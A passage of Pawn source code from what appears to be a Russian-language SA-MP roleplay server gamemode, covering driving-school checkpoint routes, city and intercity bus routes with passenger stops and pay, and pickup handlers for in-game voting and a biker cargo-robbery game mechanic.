				case 1: for(car = 0; car < sizeof(Farmcar_coord_one); car++) if(!PlayerToPoint(10.0, playerid, Farmcar_coord_one[car][0], Farmcar_coord_one[car][1], Farmcar_coord_one[car][2])) return true;
				case 2: for(car = 0; car < sizeof(Farmcar_coord_two); car++) if(!PlayerToPoint(10.0, playerid, Farmcar_coord_two[car][0], Farmcar_coord_two[car][1], Farmcar_coord_two[car][2])) return true;
				case 3: for(car = 0; car < sizeof(Farmcar_coord_three); car++) if(!PlayerToPoint(10.0, playerid, Farmcar_coord_three[car][0], Farmcar_coord_three[car][1], Farmcar_coord_three[car][2])) return true;
				case 4: for(car = 0; car < sizeof(Farmcar_coord_four); car++) if(!PlayerToPoint(10.0, playerid, Farmcar_coord_four[car][0], Farmcar_coord_four[car][1], Farmcar_coord_four[car][2])) return true;
				case 5: for(car = 0; car < sizeof(Farmcar_coord_five); car++) if(!PlayerToPoint(10.0, playerid, Farmcar_coord_five[car][0], Farmcar_coord_five[car][1], Farmcar_coord_five[car][2])) return true;
			}*/
			TogglePlayerControllable(playerid, 0);
			SCM(playerid,COLOR_YELLOW," Пожалуйста подождите");
			GetVehiclePos(GetPlayerVehicleID(playerid), car_coord[GetPlayerVehicleID(playerid)][0], car_coord[GetPlayerVehicleID(playerid)][1], car_coord[GetPlayerVehicleID(playerid)][2]);
			GetVehicleZAngle(GetPlayerVehicleID(playerid),car_coord[GetPlayerVehicleID(playerid)][3]);
			GetXYInBackOfPlayer(playerid, car_coord[GetPlayerVehicleID(playerid)][0], car_coord[GetPlayerVehicleID(playerid)][1],3.0);
			return SetTimerEx("Farmduty" , 2000, false, "i", playerid);
		}
		if(LessonCar[playerid] == 1)
		{
			switch(pLessonCar[playerid])
			{
			case CHECKPOINT_1:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_3;
					SetPlayerRaceCheckpoint(playerid, 0,-2047.3120,-82.8890,34.9072,-2047.3120,-82.8890,34.9072, 5.0);
				}
			case CHECKPOINT_3:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_4;
					SetPlayerRaceCheckpoint(playerid, 0,-2020.2249,-72.4633,34.9145,-2004.6350,-55.5920,34.9081, 5.0);
				}
			case CHECKPOINT_4:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_5;
					SetPlayerRaceCheckpoint(playerid, 0,-2004.6350,-55.5920,34.9081,-2004.0828,63.9897,29.0385, 5.0);
				}
			case CHECKPOINT_5:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_6;
					SetPlayerRaceCheckpoint(playerid, 0,-2004.0828,63.9897,29.0385,-2004.9127,159.6589,27.2818, 5.0);
				}
			case CHECKPOINT_6:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_7;
					SetPlayerRaceCheckpoint(playerid, 0,-2004.9127,159.6589,27.2818,-2022.3209,172.0152,28.4565, 5.0);
				}
			case CHECKPOINT_7:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_8;
					SetPlayerRaceCheckpoint(playerid, 0,-2022.3209,172.0152,28.4565,-2029.9869,156.7025,28.5793, 5.0);
				}
			case CHECKPOINT_8:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_9;
					SetPlayerRaceCheckpoint(playerid, 0,-2029.9869,156.7025,28.5793,-2017.3555,138.1394,27.6932, 5.0);
				}
			case CHECKPOINT_9:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_10;
					SetPlayerRaceCheckpoint(playerid, 0,-2017.3555,138.1394,27.6932,-2003.2570,159.9656,27.2823, 5.0);
				}
			case CHECKPOINT_10:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_11;
					SetPlayerRaceCheckpoint(playerid, 0,-2003.2570,159.9656,27.2823,-2000.3943,288.7868,33.7211, 5.0);
				}
			case CHECKPOINT_11:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_13;//
					SetPlayerRaceCheckpoint(playerid, 0,-2000.3943,288.7868,33.7211,-2021.0210,321.9275,34.7585, 5.0);
				}
			case CHECKPOINT_13:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_14;//
					SetPlayerRaceCheckpoint(playerid, 0,-2021.0210,321.9275,34.7585,-2239.3616,321.8053,34.9154, 5.0);
				}
			case CHECKPOINT_14:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_15;//
					SetPlayerRaceCheckpoint(playerid, 0,-2239.3616,321.8053,34.9154,-2254.4856,298.3696,34.9073, 5.0);
				}
			case CHECKPOINT_15:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_16;//
					SetPlayerRaceCheckpoint(playerid, 0,-2254.4856,298.3696,34.9073,-2259.3555,-59.4185,34.9898, 5.0);
				}
			case CHECKPOINT_16:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_17;//
					SetPlayerRaceCheckpoint(playerid, 0,-2259.3555,-59.4185,34.9898,-2409.8345,-67.7337,35.0145, 5.0);
				}
			case CHECKPOINT_17:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_18;//
					SetPlayerRaceCheckpoint(playerid, 0,-2409.8345,-67.7337,35.0145,-2423.4453,-116.1348,35.0505, 5.0);
				}
			case CHECKPOINT_18:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_19;//
					SetPlayerRaceCheckpoint(playerid, 0,-2423.4453,-116.1348,35.0505,-2430.5403,-197.4688,35.0630, 5.0);
				}
			case CHECKPOINT_19:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_20;//
					SetPlayerRaceCheckpoint(playerid, 0,-2430.5403,-197.4688,35.0630,-2512.2915,-207.9353,24.7875, 5.0);
				}
			case CHECKPOINT_20:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_21;//
					SetPlayerRaceCheckpoint(playerid, 0,-2512.2915,-207.9353,24.7875,-2698.0916,-208.0479,3.9219, 5.0);
				}
			case CHECKPOINT_21:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_22;//
					SetPlayerRaceCheckpoint(playerid, 0,-2698.0916,-208.0479,3.9219,-2704.1455,-177.0296,3.9226, 5.0);
				}
			case CHECKPOINT_22:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_23;//
					SetPlayerRaceCheckpoint(playerid, 0,-2704.1455,-177.0296,3.9226,-2703.7417,129.7518,3.9227, 5.0);
				}
			case CHECKPOINT_23:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_24;//
					SetPlayerRaceCheckpoint(playerid, 0,-2703.7417,129.7518,3.9227,-2704.3784,324.0871,3.9407, 5.0);
				}
			case CHECKPOINT_24:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_25;//
					SetPlayerRaceCheckpoint(playerid, 0,-2704.3784,324.0871,3.9407,-2687.5083,333.3723,3.9292, 5.0);
				}
			case CHECKPOINT_25:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_26;//
					SetPlayerRaceCheckpoint(playerid, 0,-2687.5083,333.3723,3.9292,-2660.8440,347.2428,3.9233, 5.0);
				}
			case CHECKPOINT_26:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_27;//
					SetPlayerRaceCheckpoint(playerid, 0,-2660.8440,347.2428,3.9233,-2660.1770,402.8072,3.8754, 5.0);
				}
			case CHECKPOINT_27:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_28;//
					SetPlayerRaceCheckpoint(playerid, 0,-2660.1770,402.8072,3.8754,-2695.0830,417.7195,3.8885, 5.0);
				}
			case CHECKPOINT_28:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_29;//
					SetPlayerRaceCheckpoint(playerid, 0,-2695.0830,417.7195,3.8885,-2703.8547,455.9360,3.9302, 5.0);
				}
			case CHECKPOINT_29:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_30;//
					SetPlayerRaceCheckpoint(playerid, 0,-2703.8547,455.9360,3.9302,-2747.8162,554.4193,14.1497, 5.0);
				}
			case CHECKPOINT_30:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_31;//
					SetPlayerRaceCheckpoint(playerid, 0,-2747.8162,554.4193,14.1497,-2671.2651,562.7997,14.2034, 5.0);
				}
			case CHECKPOINT_31:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_32;//
					SetPlayerRaceCheckpoint(playerid, 0,-2671.2651,562.7997,14.2034,-2538.5269,562.7781,14.2080, 5.0);
				}
			case CHECKPOINT_32:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_33;//
					SetPlayerRaceCheckpoint(playerid, 0,-2538.5269,562.7781,14.2080,-2525.4382,600.6388,21.0344, 5.0);
				}
			case CHECKPOINT_33:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_34;//
					SetPlayerRaceCheckpoint(playerid, 0,-2525.4382,600.6388,21.0344,-2523.5493,815.4084,49.6125, 5.0);
				}
			case CHECKPOINT_34:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_35;//
					SetPlayerRaceCheckpoint(playerid, 0,-2523.5493,815.4084,49.6125,-2524.7771,1012.3589,77.9656, 5.0);
				}
			case CHECKPOINT_35:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_36;//
					SetPlayerRaceCheckpoint(playerid, 0,-2524.7771,1012.3589,77.9656,-2519.0784,1102.1168,55.3142, 5.0);
				}
			case CHECKPOINT_36:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_37;//
					SetPlayerRaceCheckpoint(playerid, 0,-2519.0784,1102.1168,55.3142,-2543.8076,1121.2388,55.3183, 5.0);
				}
			case CHECKPOINT_37:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_38;//
					SetPlayerRaceCheckpoint(playerid, 0,-2543.8076,1121.2388,55.3183,-2654.0317,1195.3846,55.1729, 5.0);
				}
			case CHECKPOINT_38:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_40;//
					SetPlayerRaceCheckpoint(playerid, 0,-2654.0317,1195.3846,55.1729,-2534.5251,1185.9242,42.3106, 5.0);
				}
			case CHECKPOINT_40:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_41;//
					SetPlayerRaceCheckpoint(playerid, 0,-2534.5251,1185.9242,42.3106,-2454.5630,1222.4424,34.7949, 5.0);
				}
			case CHECKPOINT_41:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_42;//
					SetPlayerRaceCheckpoint(playerid, 0,-2454.5630,1222.4424,34.7949,-2453.9104,1363.3192,6.7814, 5.0);
				}
			case CHECKPOINT_42:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_43;//
					SetPlayerRaceCheckpoint(playerid, 0,-2453.9104,1363.3192,6.7814,-2327.0271,1363.4899,6.7821, 5.0);
				}
			case CHECKPOINT_43:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_44;//
					SetPlayerRaceCheckpoint(playerid, 0,-2327.0271,1363.4899,6.7821,-2280.0376,1333.7422,6.7823, 5.0);
				}
			case CHECKPOINT_44:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_45;//
					SetPlayerRaceCheckpoint(playerid, 0,-2280.0376,1333.7422,6.7823,-2061.0693,1305.2551,6.8781, 5.0);
				}
			case CHECKPOINT_45:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_46;//
					SetPlayerRaceCheckpoint(playerid, 0,-2061.0693,1305.2551,6.8781,-2009.4646,1285.4056,6.7899, 5.0);
				}
			case CHECKPOINT_46:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_47;//
					SetPlayerRaceCheckpoint(playerid, 0,-2009.4646,1285.4056,6.7899,-1912.2991,1291.7936,6.7814, 5.0);
				}
			case CHECKPOINT_47:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_48;//
					SetPlayerRaceCheckpoint(playerid, 0,-1912.2991,1291.7936,6.7814,-1760.2518,1337.8812,6.7821, 5.0);
				}
			case CHECKPOINT_48:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_49;//
					SetPlayerRaceCheckpoint(playerid, 0,-1760.2518,1337.8812,6.7821,-1639.5083,1216.5533,6.7822, 5.0);
				}
			case CHECKPOINT_49:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_50;//
					SetPlayerRaceCheckpoint(playerid, 0,-1639.5083,1216.5533,6.7822,-1607.8207,1030.2471,6.7816, 5.0);
				}
			case CHECKPOINT_50:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_51;//
					SetPlayerRaceCheckpoint(playerid, 0,-1607.8207,1030.2471,6.7816,-1563.3192,814.5651,6.7817, 5.0);
				}
			case CHECKPOINT_51:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_52;//
					SetPlayerRaceCheckpoint(playerid, 0,-1563.3192,814.5651,6.7817,-1563.3192,743.6430,6.7820, 5.0);
				}
			case CHECKPOINT_52:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_53;//
					SetPlayerRaceCheckpoint(playerid, 0,-1563.3192,743.6430,6.7820,-1703.4800,735.9361,24.4788, 5.0);
				}
			case CHECKPOINT_53:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_54;//
					SetPlayerRaceCheckpoint(playerid, 0,-1703.4800,735.9361,24.4788,-1716.9756,700.5042,24.4776, 5.0);
				}
			case CHECKPOINT_54:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_55;//
					SetPlayerRaceCheckpoint(playerid, 0,-1716.9756,700.5042,24.4776,-1823.9097,610.2460,34.7587, 5.0);
				}
			case CHECKPOINT_55:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_56;//
					SetPlayerRaceCheckpoint(playerid, 0,-1823.9097,610.2460,34.7587,-1993.1875,609.6210,34.7618, 5.0);
				}
			case CHECKPOINT_56:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_57;//
					SetPlayerRaceCheckpoint(playerid, 0,-1993.1875,609.6210,34.7618,-2007.4740,530.2824,34.7916, 5.0);
				}
			case CHECKPOINT_57:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_58;//
					SetPlayerRaceCheckpoint(playerid, 0,-2007.4740,530.2824,34.7916,-2008.0841,466.2849,34.7550, 5.0);
				}
			case CHECKPOINT_58:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_59;//
					SetPlayerRaceCheckpoint(playerid, 0,-2008.0841,466.2849,34.7550,-2009.4291,191.2641,27.2783, 5.0);
				}
			case CHECKPOINT_59:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_60;//
					SetPlayerRaceCheckpoint(playerid, 0,-2009.4291,191.2641,27.2783,-2009.0417,-13.3749,34.3996, 5.0);
				}
			case CHECKPOINT_60:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_61;//
					SetPlayerRaceCheckpoint(playerid, 0,-2009.0417,-13.3749,34.3996,-2008.8506,-57.0414,34.9097, 5.0);
				}
			case CHECKPOINT_61:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_62;//
					SetPlayerRaceCheckpoint(playerid, 0,-2008.8506,-57.0414,34.9097,-2036.2216,-67.9920,34.9151, 5.0);
				}
			case CHECKPOINT_62:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_63;//
					SetPlayerRaceCheckpoint(playerid, 0,-2036.2216,-67.9920,34.9151,-2047.7125,-81.9187,34.9092, 5.0);
				}
			case CHECKPOINT_63:
				{
					LessonStat[playerid]++;
					pLessonCar[playerid] = CHECKPOINT_64;
					SetPlayerRaceCheckpoint(playerid, 1,-2047.7125,-81.9187,34.9092,0.0,0.0,0.0, 5.0);
				}
			case CHECKPOINT_64:
				{
					new Float:health;
					GetVehicleHealth(GetPlayerVehicleID(playerid),health);
					if (health >= 850)
					{
						SCM(playerid, COLOR_GREEN, "Припаркуйте автомобиль и пройдите в здание автошколы");
						SetPVarInt(playerid,"givecarlic",1);
						DisablePlayerRaceCheckpoint(playerid);
					}
					else
					{
						SCM(playerid, COLOR_GREEN, "Припаркуйте автомобиль и пройдите в здание автошколы");
						SetPVarInt(playerid,"givecarlic",2);
						DisablePlayerRaceCheckpoint(playerid);
					}
				}
			}
		}
		if(GetPVarInt(playerid, "TypeBus") > 0)
		{
			new type = GetPVarInt(playerid, "TypeBus"), e_type, name[35];
			switch(GetPVarInt(playerid, "TypeBus"))
			{
			case 1: name = "ВнутриГородской ЛС";
			case 2: name = "ВнутриГородской СФ";
			case 3: name = "ВнутриГородской ЛВ";
			case 4: name = "АвтоВокзал LS << >> Автошкола SF";
			case 5: name = "АвтоВокзал LS << >> АвтоВокзал LV";
			case 6: name = "АвтоВокзал LS << >> Заводы";
			}
			if(type == 1)
			{
				if(pPressed[playerid] == 7 || pPressed[playerid] == 16 || pPressed[playerid] == 24 || pPressed[playerid] == 38 || pPressed[playerid] == 66 || pPressed[playerid] == 74 || pPressed[playerid] == 88 || pPressed[playerid] == 107  || pPressed[playerid] == 111|| pPressed[playerid] == 132)
				{
					if(GetPVarInt(playerid, "BusStop") == 0)
					{
						SetPVarInt(playerid, "TimeBus", 11);
						SCM(playerid, 0x33aa33ff, " Остановка! Ждите пассажиров");
						format(string, 90, " Автобус отъезжает через 10 секунд");
						ProxDetector(30.0, playerid, string, 0x33aa33ff,0x33aa33ff,0x33aa33ff,0x33aa33ff,0x33aa33ff);
					}
					else
					{
						if(pPressed[playerid] == 128) pPressed[playerid] = 0;
						else pPressed[playerid]++;
						new i = pPressed[playerid];
						SetPlayerRaceCheckpoint(playerid,0,BusCityLS[i][0],BusCityLS[i][1],BusCityLS[i][2],BusCityLS[i][3],BusCityLS[i][4],BusCityLS[i][5],7.0);
						SetPVarInt(playerid, "BusStop", 0);
					}
				}
				else
				{
					pPressed[playerid]++;
					SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 50);
					PlayerInfo[playerid][pPayCheck] += 50;
					if(pPressed[playerid] == 7 || pPressed[playerid] == 16 || pPressed[playerid] == 24 || pPressed[playerid] == 38 || pPressed[playerid] == 66 || pPressed[playerid] == 74 || pPressed[playerid] == 88 || pPressed[playerid] == 107  || pPressed[playerid] == 111|| pPressed[playerid] == 132) e_type = 1;
					else e_type = 0;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,e_type,BusCityLS[i][0],BusCityLS[i][1],BusCityLS[i][2],BusCityLS[i][3],BusCityLS[i][4],BusCityLS[i][5],7.0);
				}
			}
			if(type == 2) // 9, 46, 82 / 91
			{
				if(pPressed[playerid] == 3 || pPressed[playerid] == 10 || pPressed[playerid] == 20 || pPressed[playerid] == 32 || pPressed[playerid] == 35 || pPressed[playerid] == 40 || pPressed[playerid] == 46 || pPressed[playerid] == 53 || pPressed[playerid] == 56)
				{
					if(GetPVarInt(playerid, "BusStop") == 0)
					{
						SetPVarInt(playerid, "TimeBus", 11);
						SCM(playerid, 0x33aa33ff, " Остановка! Ждите пассажиров");
						format(string, 90, " Автобус отъезжает через 10 секунд");
						ProxDetector(30.0, playerid, string, 0x33aa33ff,0x33aa33ff,0x33aa33ff,0x33aa33ff,0x33aa33ff);
					}
					else
					{
						if(pPressed[playerid] == 56) pPressed[playerid] = 0;
						else pPressed[playerid]++;
						new i = pPressed[playerid];
						SetPlayerRaceCheckpoint(playerid,0,BusCitySF[i][0],BusCitySF[i][1],BusCitySF[i][2],BusCitySF[i][3],BusCitySF[i][4],BusCitySF[i][5],7.0);
						SetPVarInt(playerid, "BusStop", 0);
					}
				}
				else
				{
					pPressed[playerid]++;
					SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 70);
					PlayerInfo[playerid][pPayCheck] += 70;
					if(pPressed[playerid] == 3 || pPressed[playerid] == 10 || pPressed[playerid] == 20 || pPressed[playerid] == 32 || pPressed[playerid] == 35 || pPressed[playerid] == 40 || pPressed[playerid] == 46 || pPressed[playerid] == 53 || pPressed[playerid] == 56) e_type = 1;
					else e_type = 0;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,e_type,BusCitySF[i][0],BusCitySF[i][1],BusCitySF[i][2],BusCitySF[i][3],BusCitySF[i][4],BusCitySF[i][5],7.0);
				}
			}
			if(type == 3)
			{
				if(pPressed[playerid] == 7 || pPressed[playerid] == 10 || pPressed[playerid] == 18 || pPressed[playerid] == 24 || pPressed[playerid] == 32 || pPressed[playerid] == 39 || pPressed[playerid] == 51 || pPressed[playerid] == 64 || pPressed[playerid] == 71  || pPressed[playerid] == 79)
				{
					if(GetPVarInt(playerid, "BusStop") == 0)
					{
						SetPVarInt(playerid, "TimeBus", 11);
						SCM(playerid, 0x33aa33ff, " Остановка! Ждите пассажиров");
						format(string, 90, " Автобус отъезжает через 10 секунд");
						ProxDetector(30.0, playerid, string, 0x33aa33ff,0x33aa33ff,0x33aa33ff,0x33aa33ff,0x33aa33ff);
					}
					else
					{
						if(pPressed[playerid] == 79) pPressed[playerid] = 0;
						else pPressed[playerid]++;
						new i = pPressed[playerid];
						SetPlayerRaceCheckpoint(playerid,0,BusCityLV[i][0],BusCityLV[i][1],BusCityLV[i][2],BusCityLV[i][3],BusCityLV[i][4],BusCityLV[i][5],7.0);
						SetPVarInt(playerid, "BusStop", 0);
					}
				}
				else
				{
					pPressed[playerid]++;
					SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 60);
					PlayerInfo[playerid][pPayCheck] += 60;
					if(pPressed[playerid] == 7 || pPressed[playerid] == 10 || pPressed[playerid] == 18 || pPressed[playerid] == 24 || pPressed[playerid] == 32 || pPressed[playerid] == 39 || pPressed[playerid] == 51 || pPressed[playerid] == 64 || pPressed[playerid] == 71 || pPressed[playerid] == 79) e_type = 1;
					else e_type = 0;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,e_type,BusCityLV[i][0],BusCityLV[i][1],BusCityLV[i][2],BusCityLV[i][3],BusCityLV[i][4],BusCityLV[i][5],7.0);
				}
			}
			if(type == 4)
			{
				if(pPressed[playerid] == 0 || pPressed[playerid] == 8 || pPressed[playerid] == 45 || pPressed[playerid] == 48 || pPressed[playerid] == 52 || pPressed[playerid] == 86|| pPressed[playerid] == 96)
				{
					if(GetPVarInt(playerid, "BusStop") == 0)
					{
						SetPVarInt(playerid, "TimeBus", 11);
						SCM(playerid, COLOR_GREEN, " Остановите автобус и подождите пассажиров!");
						format(string, 90, " Автобус АвтоВокзал LS << >> Автошкола SF  отъезжает через 10 секунд");
						ProxDetector(30.0, playerid, string, COLOR_GREEN,COLOR_GREEN,COLOR_GREEN,COLOR_GREEN,COLOR_GREEN);
					}
					else
					{
						if(pPressed[playerid] == 95) pPressed[playerid] = 0;
						else pPressed[playerid]++;
						new i = pPressed[playerid];
						SetPlayerRaceCheckpoint(playerid,0,BusSchool[i][0],BusSchool[i][1],BusSchool[i][2],BusSchool[i][3],BusSchool[i][4],BusSchool[i][5],7.0);
						SetPVarInt(playerid, "BusStop", 0);
					}
				}
				else
				{
					pPressed[playerid]++;
					SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 40);
					PlayerInfo[playerid][pPayCheck] += 40;
					if(pPressed[playerid] == 0 || pPressed[playerid] == 8 || pPressed[playerid] == 45 || pPressed[playerid] == 48 || pPressed[playerid] == 52 || pPressed[playerid] == 86|| pPressed[playerid] == 96) e_type = 1;
					else e_type = 0;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,e_type,BusSchool[i][0],BusSchool[i][1],BusSchool[i][2],BusSchool[i][3],BusSchool[i][4],BusSchool[i][5],7.0);
				}
			}
			if(type == 5)
			{
				if(pPressed[playerid] == 0 || pPressed[playerid] == 10 || pPressed[playerid] == 36  || pPressed[playerid] == 60 || pPressed[playerid] == 69)
				{
					if(GetPVarInt(playerid, "BusStop") == 0)
					{
						SetPVarInt(playerid, "TimeBus", 11);
						SCM(playerid, COLOR_GREEN, " Остановите автобус и подождите пассажиров!");
						format(string, 90, " Автобус АвтоВокзал LS << >> АвтоВокзал LV отъезжает через 10 секунд");
						ProxDetector(30.0, playerid, string, COLOR_GREEN,COLOR_GREEN,COLOR_GREEN,COLOR_GREEN,COLOR_GREEN);
					}
					else
					{
						if(pPressed[playerid] == 69) pPressed[playerid] = 0;
						else pPressed[playerid]++;
						new i = pPressed[playerid];
						SetPlayerRaceCheckpoint(playerid,0,BusLSLV[i][0],BusLSLV[i][1],BusLSLV[i][2],BusLSLV[i][3],BusLSLV[i][4],BusLSLV[i][5],7.0);
						SetPVarInt(playerid, "BusStop", 0);
					}
				}
				else
				{
					pPressed[playerid]++;
					SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 60);
					PlayerInfo[playerid][pPayCheck] += 60;
					if(pPressed[playerid] == 0 || pPressed[playerid] == 10 || pPressed[playerid] == 36  || pPressed[playerid] == 60 || pPressed[playerid] == 69) e_type = 1;
					else e_type = 0;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,e_type,BusLSLV[i][0],BusLSLV[i][1],BusLSLV[i][2],BusLSLV[i][3],BusLSLV[i][4],BusLSLV[i][5],7.0);
				}
			}
			if(type == 6)
			{
				if(pPressed[playerid] == 0 || pPressed[playerid] == 10 || pPressed[playerid] == 36  || pPressed[playerid] == 60 || pPressed[playerid] == 69)
				{
					if(GetPVarInt(playerid, "BusStop") == 0)
					{
						SetPVarInt(playerid, "TimeBus", 11);
						SCM(playerid, COLOR_GREEN, " Остановите автобус и подождите пассажиров!");
						format(string, 90, " Автобус АвтоВокзал LS << >> Заводы отъезжает через 10 секунд");
						ProxDetector(30.0, playerid, string, COLOR_GREEN,COLOR_GREEN,COLOR_GREEN,COLOR_GREEN,COLOR_GREEN);
					}
					else
					{
						if(pPressed[playerid] == 69) pPressed[playerid] = 0;
						else pPressed[playerid]++;
						new i = pPressed[playerid];
						SetPlayerRaceCheckpoint(playerid,0,BusLSZavodi[i][0],BusLSZavodi[i][1],BusLSZavodi[i][2],BusLSZavodi[i][3],BusLSZavodi[i][4],BusLSZavodi[i][5],7.0);
						SetPVarInt(playerid, "BusStop", 0);
					}
				}
				else
				{
					pPressed[playerid]++;
					SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 60);
					PlayerInfo[playerid][pPayCheck] += 60;
					if(pPressed[playerid] == 0 || pPressed[playerid] == 10 || pPressed[playerid] == 36  || pPressed[playerid] == 60 || pPressed[playerid] == 69) e_type = 1;
					else e_type = 0;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,e_type,BusLSZavodi[i][0],BusLSZavodi[i][1],BusLSZavodi[i][2],BusLSZavodi[i][3],BusLSZavodi[i][4],BusLSZavodi[i][5],7.0);
				}
			}
		}
	}
	return true;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
	return true;
}

public OnRconCommand(cmd[])
{
	return true;
}
public OnRconLoginAttempt(ip[], password[], success) return false;
public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
	if(SERVERTEST) SendMes(playerid,COLOR_BLUE,"PICKUP: PLAYERID - %i, PICKUPID",playerid,pickupid);
	printf("Паблик динамических пикапов сработал, %d", pickupid);
	if(pickupid == oldpickup[playerid] || timepickup[playerid] > 0) return true;
	oldpickup[playerid] = pickupid;
	timepickup[playerid] = 8;
	for(new i; i < 20; i++)
	{
		if(pickupid == LPick[i])
 		{
   			if(PlayerInfo[playerid][progolos] == true) return SendClientMessage(playerid,COLOR_GREY," Вы уже голосовали!");
			new str[512];
	     	for(new h = 0; h < idgols; h++)
	 		{
	 			new strz[64];
	 			format(strz,sizeof(str2),"%s\n",Golosovan[h][Variant]);
	 			strcat(str,strz,sizeof(str));
	 		}
	 		ShowPlayerDialogEx(playerid,1134,DIALOG_STYLE_LIST,GL2[NameGolos],str,"Выбор","Отмена");
 		}
 	}

	new Float:zx;
	GetPlayerPos(playerid, PickupX[playerid], PickupY[playerid], zx);
	if(pickupid == RobbingBiker[pickup])
	{
	    if(!IsABiker(playerid)) return true;
	    if(RobbingBiker[robType] == 1)
	 	{
	 	    ClearAnimations(playerid);
		    ApplyAnimation(playerid, "CARRY", "crry_prtial",4.0,1,0,0,1,1,1);
			SetPlayerAttachedObject(playerid, 1 , 2969, 1,0.11,0.36,0.0,0.0,90.0);
			MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad] -= 250;
	        format(string, sizeof(string), "Кол-во груза\n%i", MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad]);
	        UpdateDynamic3DTextLabelText(Rob3DText, 0xEDEA9FAA, string);
	        if(MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad] <= 0)
	        {
				DestroyDynamicPickup(RobbingBiker[pickup]);
				RobbingBiker[pickup] = -1;
				DestroyDynamic3DTextLabel(Rob3DText);
